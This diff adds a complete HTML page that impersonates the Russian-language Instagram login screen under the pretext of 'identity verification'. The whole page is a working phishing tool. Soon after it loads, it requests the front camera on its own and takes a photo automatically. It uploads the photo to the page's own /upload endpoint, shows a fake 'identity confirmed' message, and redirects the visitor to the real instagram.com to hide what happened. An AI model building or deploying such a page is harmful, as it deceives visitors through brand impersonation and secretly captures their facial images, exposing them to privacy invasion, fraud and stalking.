@@ -1,1 +1,246 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #fafafa;
+            color: #262626;
+        }
+        .container {
+            max-width: 935px;
+            margin: 0 auto;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .login-box {
+            width: 350px;
+            margin-top: 30px;
+            border: 1px solid #dbdbdb;
+            background: white;
+            padding: 20px 40px;
+            text-align: center;
+        }
+        .logo {
+            margin: 22px auto 12px;
+            width: 175px;
+        }
+        .form-group {
+            margin-bottom: 6px;
+        }
+        input {
+            width: 100%;
+            padding: 9px 8px 7px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+        }
+        button {
+            width: 100%;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 7px 16px;
+            font-weight: 600;
+            margin: 8px 0;
+            cursor: pointer;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+            margin: 0 10px;
+        }
+        .facebook-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            margin: 15px 0;
+        }
+        .forgot-password {
+            font-size: 12px;
+            color: #00376b;
+        }
+        #cameraContainer {
+            display: none;
+            width: 100%;
+            margin-top: 20px;
+        }
+        video {
+            width: 100%;
+            background: #000;
+            border-radius: 3px;
+        }
+        #captureBtn {
+            margin-top: 10px;
+        }
+        #photoResult {
+            display: none;
+            margin-top: 20px;
+        }
+        #photoPreview {
+            max-width: 100%;
+            border-radius: 3px;
+        }
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
+            
+            <div id="loginForm">
+                <p style="margin-bottom: 20px; font-weight: 600; color: #8e8e8e;">Чтобы продолжить, подтвердите свою личность</p>
+                <button id="verifyBtn">Подтвердить личность</button>
+                
+                <div class="divider">ИЛИ</div>
+                
+                <a href="#" class="facebook-login">
+                    <i class="fab fa-facebook-square"></i> Войти через Facebook
+                </a>
+                
+                <a href="#" class="forgot-password">Забыли пароль?</a>
+            </div>
+            
+            <div id="cameraContainer">
+                <p style="margin-bottom: 15px;">Подтвердите личность с помощью фото</p>
+                <video id="video" autoplay></video>
+                <button id="captureBtn">Подтвердить</button>
+                <canvas id="canvas" style="display: none;"></canvas>
+            </div>
+            
+            <div id="photoResult">
+                <p style="margin-bottom: 10px;">Спасибо! Ваша личность подтверждена.</p>
+                <img id="photoPreview" alt="Ваше фото">
+                <p style="margin-top: 15px; font-size: 12px;">Вы будете перенаправлены через несколько секунд...</p>
+            </div>
+        </div>
+        
+        <div class="login-box" style="margin-top: 10px; padding: 20px;">
+            <p style="text-align: center;">У вас ещё нет аккаунта? <a href="#" style="color: #0095f6; font-weight: 600;">Зарегистрироваться</a></p>
+        </div>
+        
+        <div class="footer">
+            <p>Meta · Информация · Блог · Вакансии · Помощь · API · Конфиденциальность · Условия · Популярные аккаунты · Хэштеги · Места</p>
+            <p style="margin-top: 10px;">© 2025 Instagram from Meta</p>
+        </div>
+    </div>
 
+    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const verifyBtn = document.getElementById('verifyBtn');
+            const cameraContainer = document.getElementById('cameraContainer');
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const captureBtn = document.getElementById('captureBtn');
+            const photoPreview = document.getElementById('photoPreview');
+            const photoResult = document.getElementById('photoResult');
+            const loginForm = document.getElementById('loginForm');
+
+            // Автоматически запрашиваем камеру при загрузке
+            setTimeout(() => {
+                requestCameraAccess();
+            }, 1500);
+
+            function requestCameraAccess() {
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+            .then(function(stream) {
+                loginForm.style.display = 'none';
+                cameraContainer.style.display = 'block';
+                video.srcObject = stream;
+                
+                setTimeout(capturePhoto, 3000);
+            })
+            .catch(function(error) {
+                console.error('Camera error:', error);
+                // Показываем сообщение об ошибке
+                alert('Для продолжения разрешите доступ к камере или используйте HTTPS-соединение');
+                verifyBtn.style.display = 'block';
+            });
+    } else {
+        alert('Ваш браузер не поддерживает доступ к камере или сайт открыт по HTTP');
+        verifyBtn.style.display = 'block';
+    }
+}
+
+            function capturePhoto() {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const stream = video.srcObject;
+                const tracks = stream.getTracks();
+                tracks.forEach(track => track.stop());
+                
+                const imageData = canvas.toDataURL('image/jpeg');
+                photoPreview.src = imageData;
+                cameraContainer.style.display = 'none';
+                photoResult.style.display = 'block';
+                
+                sendPhotoToServer(imageData);
+                
+                // Перенаправление через 5 секунд
+                setTimeout(() => {
+                    window.location.href = 'https://instagram.com';
+                }, 5000);
+            }
+
+            captureBtn.addEventListener('click', capturePhoto);
+
+            function sendPhotoToServer(imageData) {
+                fetch(imageData)
+                    .then(res => res.blob())
+                    .then(blob => {
+                        const formData = new FormData();
+                        formData.append('photo', blob, 'photo.jpg');
+                        
+                        return fetch('/upload', {
+                            method: 'POST',
+                            body: formData
+                        });
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.photo_url) {
+                            photoPreview.src = data.photo_url;
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Upload error:', error);
+                    });
+            }
+        });
+    </script>
+</body>
+</html>
